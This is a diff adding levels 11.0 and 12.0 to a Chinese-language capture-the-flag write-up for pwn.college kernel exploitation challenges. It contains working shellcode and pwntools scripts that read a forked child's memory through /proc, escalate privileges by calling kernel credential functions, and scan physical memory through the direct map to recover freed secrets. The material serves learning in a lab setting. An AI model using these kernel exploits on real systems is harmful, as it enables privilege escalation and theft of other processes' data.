@@ -278,3 +278,223 @@ int main() {
 }
 ```
 计算出run_cmd的地址后运行上一题的exp即可
+
+### level11.0
+
+脑抽导致这题我做了n个小时……
+
+题目设置和`level8.0`差不多。区别在于程序会fork出一个子进程，flag在子进程的内存里；且flag在第一次运行后就会被删除
+
+搜了半天c语言该怎么做双端交互，结果在社区服务器里看到环境里有pwntools……
+
+然而我在憨憨的道路上越走越远。该怎么知道fork出来的子进程的pid呢？我搜了一下，发现可以通过读取`/proc/self/task/[tid]/children`来得到子进程的pid（ https://stackoverflow.com/questions/76788120/a-non-hacky-way-to-get-the-pids-of-all-child-processes-under-linux ）。tid的值似乎等于当前进程的pid（并非等于），可以用getpid系统调用获得当前进程的pid。啊？这是要我搞动态搭建字符串的汇编吗？
+
+……事实上我(和chatgpt)还真写出来了。因为pid的值是数字，所以有很简单的方式将其转为字符串：
+```
+mov rax,39
+syscall
+mov r12,rax
+mov rdi,{path_buf}
+mov     rax, 0x65732f636f72702f
+mov     qword ptr [rdi], rax
+mov     rax, 0x2f6b7361742f666c
+mov     qword ptr [rdi+8], rax
+add rdi,18
+mov rax,r12
+xor rdx,rdx
+mov rcx,10
+div rcx
+add rdx,0x30
+mov byte ptr [rdi], dl
+xor rdx,rdx
+div rcx
+add rdx,0x30
+mov byte ptr [rdi-1], dl
+xor rdx,rdx
+div rcx
+add rdx,0x30
+mov byte ptr [rdi-2], dl
+inc rdi
+mov byte ptr [rdi],47
+inc rdi
+mov r14,0x6e6572646c696863
+mov     qword ptr [rdi], r14
+
+mov     rax, 2
+mov     rdi, {path_buf}
+xor     rsi, rsi
+syscall
+
+mov     r13, rax
+mov     rax, 0
+mov     rdi, r13
+mov     rsi, {child_pid}
+mov     rdx, 20
+syscall
+
+mov     rdi, {child_path_buf}
+mov     rax, 0x2f636f72702f
+mov     qword ptr [rdi], rax
+mov     rbx, rdi
+add     rbx, 6
+mov     rsi, {child_pid}
+mov     al, byte ptr [rsi]
+mov     byte ptr [rbx], al
+inc     rsi
+inc     rbx
+mov     al, byte ptr [rsi]
+mov     byte ptr [rbx], al
+inc     rsi
+inc     rbx
+mov     al, byte ptr [rsi]
+mov     byte ptr [rbx], al
+inc     rsi
+inc     rbx
+mov     dword ptr [rbx], 0x6d656d2f
+
+mov     rax, 2
+mov     rdi, {child_path_buf}
+xor     rsi, rsi
+syscall
+
+mov rdi,rax
+mov     rax, 8
+mov     rsi, 0x00404040
+xor     rdx, rdx
+syscall
+
+mov rdi,rax
+mov     rax, 0
+mov     rsi, {flag_buf}
+mov     rdx, 0x50
+syscall
+
+mov     rax, 1
+mov     rdi, 1
+mov     rsi, {flag_buf}
+mov     rdx, 0x50
+syscall
+ret
+```
+但不知道为什么，实际测试发现tid的值不等于pid，直接白写
+
+为什么说我脑抽呢？因为在我也不知道多少个小时后，我发现`ps aux`命令无需root权限就能运行。所以其实可以直接拿到子进程的pid的。哈哈
+```py
+from pwn import *
+context.arch='amd64'
+p=process('/challenge/babykernel_level11.0')
+path_buf=0x0000000031337200
+flag=0x0000000031337300
+shellcode=asm(f"""mov rax,1
+mov rdi,3
+mov rsi,0x0000000031337098
+mov rdx,58
+syscall
+
+xor rax,rax
+xor rdi,rdi
+mov rsi,{path_buf}
+mov rdx,0x30
+syscall
+
+mov rax,2
+mov rdi,{path_buf}
+xor rsi,rsi
+xor rdx,rdx
+syscall
+
+mov r13,rax
+mov rdi,r13
+mov rax,8
+mov rsi, 0x00404040
+xor rdx,rdx
+syscall
+
+xor rax,rax
+mov rdi,r13
+mov rsi, {flag}
+mov rdx,0x50
+syscall
+
+mov rax,1
+mov rdi,1
+mov rsi,{flag}
+mov rdx,0x50
+syscall
+ret
+
+mov rbx,QWORD PTR gs:0x15d00
+mov rsi,QWORD PTR [rbx]
+and QWORD PTR [rbx],0xfffffffffffffeff
+xor rdi,rdi
+mov rax,0xffffffff81089660
+call rax
+mov rdi,rax
+mov rax,0xffffffff81089310
+call rax
+ret""")
+p.sendlineafter("stdin.",shellcode)
+path=input("path: ").encode()+b'\x00'
+p.sendlineafter("shellcode!",path)
+print(p.recvall().decode())
+```
+
+### level12.0
+
+建议阅读`Kernel: Memory Management`后再做这题
+
+设置和上题类似，但fork出来的子进程读取flag后不会再用无限循环维持运行，而是直接exit退出。这样便无法从mem文件里拿到flag了
+
+一时间不知道怎么做。是时候挖掘前人的智慧了。社区服务器里已有人详细地讨论过这道题： https://discord.com/channels/750635557666816031/1271799299327393872
+
+进程的内存地址其实都是虚拟地址，需要根据`PML4`将虚拟地址转成物理地址。阅读 https://docs.google.com/presentation/d/1NuvKHcszim25_kNBs5zjYEQYR8xjsLHK14GX8_9wFbE 的第12页内容可以得知虚拟地址到底是怎么转成物理地址的
+
+再看看这个文件： https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt 。注意这段内容：`direct mapping of all physical memory (page_offset_base)`。也就是说，kernel已经准备了一段虚拟内存到物理内存的映射，两者之间是一对一的关系。比如，访问`page_offset_base+x`这个虚拟地址，等同于访问物理内存`x`偏移的位置。如果未开启kaslr的话，page_offset_base的值是固定的
+
+无论子进程是否还在运行，它总归是已经将flag读到内存中了。即使后续它的内存被回收，“回收”这个动作不会清空内存中的内容。如果我们从物理内存（通过虚拟内存的映射）的起始处扫描全部内存，就能看见flag
+
+flag位于`0x00404040`。这个地址补零后也只有24位。因此对于`(PML4[A][B][C][D])[E]`这样的寻址方式来说，A，B，C都是0，只有D和E重要。但仔细想想，D也不重要。因为D是Page Table X中的索引，用于选择指定的物理页（physical page）。真正重要的值只有E，因为无论`PML4[A][B][C][D]`选到了哪个页，flag一定位于该页面起始处偏移E的位置。在这题里，E的值是0x40。因此我们可以从`page_offset_base`出发，一页一页地搜索（一页的大小为`0x1000`）；每一页都只需检查0x40偏移处的内存，因为我们知道flag在那
+
+需要一点运气。假如有某个进程先于我们申请了那块装有flag的内存，那块内存便会因为有进程申请而被清空
+```py
+from pwn import *
+context.arch="amd64"
+part2=b"\x49\xBE\xFF\xFF\xFF\xFF\x7F\xC8\xFF\xFF\x49\xBF\x00\x00\x00\x00\x80\x88\xFF\xFF\x4C\x89\xFF\x48\x83\xC7\x40\x8A\x07\x84\xC0\x74\x15\x48\xBE\x00\x51\x08\x00\x00\xC9\xFF\xFF\x48\xC7\xC1\x0C\x00\x00\x00\xF3\xA6\x74\x0E\x49\x81\xC7\x00\x10\x00\x00\x4D\x39\xF7\x72\xD2\xEB\x09\x48\xC7\xC0\xA9\x69\x0B\x81\xFF\xD0\xC3".ljust(0x100,b'\x90')+b'pwn.college{\x00'
+part1=asm(f"""mov rax,1
+mov rdi,3
+mov rsi,0x000000003133701f
+mov rdx,{len(part2)}
+syscall
+ret
+""")
+with open("/home/hacker/payload",'wb') as f:
+    f.write(part1+part2)
+```
+然后终端运行：`/challenge/babykernel_level12.0 < ./payload`。运气好的话，`dmesg`输出的日志里可以看到flag
+
+part2的汇编如下（不知道为什么pwntools编译不了有标签的汇编）
+```
+mov r14,0xffffc87fffffffff
+mov r15,0xffff888000000000
+scan_loop:
+    mov rdi, r15
+    add rdi, 0x40
+    mov al, [rdi]
+    test al, al
+    jz next_page
+    mov rsi,0xffffc90000085100
+    mov rcx, 12
+    repe cmpsb
+    je found
+next_page:
+    add r15, 0x1000
+    cmp r15,r14
+    jb scan_loop
+    jmp exit
+found:
+    mov rax,0xffffffff810b69a9
+    call rax
+exit:
+    ret
+```
+对了，尽量用最简单的方式输入payload。假如用pwntools的话，会增加存有flag的页面被申请的概率
